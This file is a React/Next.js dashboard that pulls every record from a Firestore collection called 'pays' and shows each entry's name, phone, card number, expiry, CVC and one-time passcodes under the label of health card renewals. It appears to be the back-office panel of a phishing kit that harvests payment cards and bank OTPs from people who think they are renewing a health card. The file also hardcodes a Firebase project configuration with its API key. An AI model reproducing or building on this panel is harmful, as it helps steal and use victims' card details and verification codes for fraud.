'use client'

import { useEffect, useState } from 'react'
import { initializeApp } from 'firebase/app'
import { getFirestore, collection, getDocs } from 'firebase/firestore'
import { Table, TableBody, TableCaption, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"

const firebaseConfig = {
  // Your Firebase configuration object goes here
  // You should replace this with your actual Firebase config
  apiKey: "AIzaSyDNF8IclQF8rBFiq8yPA-4Bczxzx2IJSoY",
  authDomain: "atar1-f0830.firebaseapp.com",
  projectId: "atar1-f0830",
  storageBucket: "atar1-f0830.firebasestorage.app",
  messagingSenderId: "973639712303",
  appId: "1:973639712303:web:2f32be1d28949da178d0da",
  measurementId: "G-M9JLXES2TP"
}

const app = initializeApp(firebaseConfig)
const db = getFirestore(app)

interface HealthCardRenewal {
  id: string
  step: number
  name: string
  phone: string
  dateMonth: string
  datayaer: string
  CVC: string
  otp:[string] 
  cardNumber: string
}

export default function Dashboard() {
  const [renewals, setRenewals] = useState<HealthCardRenewal[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    async function fetchRenewals() {
      try {
        const renewalsCollection = collection(db, 'pays')
        const renewalsSnapshot = await getDocs(renewalsCollection)
        const renewalsList = renewalsSnapshot.docs.map(doc => ({
          id: doc.id,
          ...doc.data()
        })) as HealthCardRenewal[]
        setRenewals(renewalsList)
        setLoading(false)
      } catch (err) {
        console.error("Error fetching renewals: ", err)
        setError("Failed to fetch renewals. Please try again later.")
        setLoading(false)
      }
    }

    fetchRenewals()
  }, [])

  if (loading) {
    return <div className="flex justify-center items-center h-screen">Loading...</div>
  }

  if (error) {
    return <div className="flex justify-center items-center h-screen text-red-500">{error}</div>
  }

  return (
    <div className="container mx-auto p-4">
      <Card>
        <CardHeader>
          <CardTitle className="text-2xl font-bold"> Dashboard</CardTitle>
        </CardHeader>
        <CardContent>
          <Table>
            <TableCaption>A list of all health card renewal submissions.</TableCaption>
            <TableHeader>
              <TableRow>
                <TableCell className="font-bold" dir='rtl'>اسم</TableCell>
                <TableCell  className="font-bold" dir='rtl'>ID </TableCell>
                <TableCell  className="font-bold" dir='rtl'>سنة</TableCell>
                <TableCell  className="font-bold" dir='rtl'>رقم البطاقة</TableCell>
                <TableCell  className="font-bold" dir='rtl'>Cvc</TableCell>
                <TableCell  className="font-bold" dir='rtl'>otp</TableCell>
              </TableRow>
            </TableHeader>
            <TableBody>
              {renewals.map((renewal) => (
                <TableRow key={renewal.id}>
                  <TableCell>{renewal.name}</TableCell>
                  <TableCell>{renewal.phone}</TableCell>
                  <TableCell>{renewal.datayaer+'/'+renewal.dateMonth}</TableCell>
                  <TableCell>{renewal.cardNumber}</TableCell>
                  <TableCell>{renewal.CVC}</TableCell>
                  <TableCell>{renewal.otp.map((i)=><i key={i}>{i}</i>)}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  )
}

